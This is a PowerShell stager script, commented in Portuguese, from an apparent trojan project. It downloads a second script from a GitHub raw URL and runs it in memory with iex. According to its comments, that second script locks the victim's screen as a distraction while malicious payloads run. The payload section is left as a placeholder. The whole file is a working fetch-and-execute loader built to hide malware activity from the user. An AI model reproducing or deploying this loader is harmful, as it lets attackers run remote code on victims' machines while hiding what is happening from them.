# ==============================================
# MASTER.ps1 - EXECUTA A DISTRAÇÃO DIRETAMENTE
# ==============================================

# Log
"$(Get-Date) - MASTER.ps1 iniciado" | Out-File "$env:TEMP\distraction_log.txt" -Append

# Baixa o DISTRACTION.ps1 para uma variável e executa (sem Start-Process)
$distractScript = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1"
try {
    $distractContent = (New-Object Net.WebClient).DownloadString($distractScript)
    "$(Get-Date) - DISTRACTION.ps1 baixado com sucesso." | Out-File "$env:TEMP\distraction_log.txt" -Append
} catch {
    "$(Get-Date) - ERRO ao baixar DISTRACTION.ps1: $_" | Out-File "$env:TEMP\distraction_log.txt" -Append
    exit 1
}

# Executa o DISTRACTION.ps1 no mesmo processo (ele vai travar a tela e ficar em loop)
# Isso vai segurar a execução até a flag ser criada
iex $distractContent

# Quando o DISTRACTION.ps1 terminar (flag criada), prossegue para os payloads
"$(Get-Date) - DISTRACTION.ps1 finalizado. Iniciando payloads." | Out-File "$env:TEMP\distraction_log.txt" -Append

# Seus payloads aqui
Write-Host "Aguardando 10 segundos (payloads vazios)" -ForegroundColor Cyan
Start-Sleep -Seconds 10

# Cria a flag (mas o DISTRACTION.ps1 já saiu, então não precisa criar de novo, mas deixamos)
# New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null
# Write-Host "Flag criada. Distração será encerrada." -ForegroundColor Green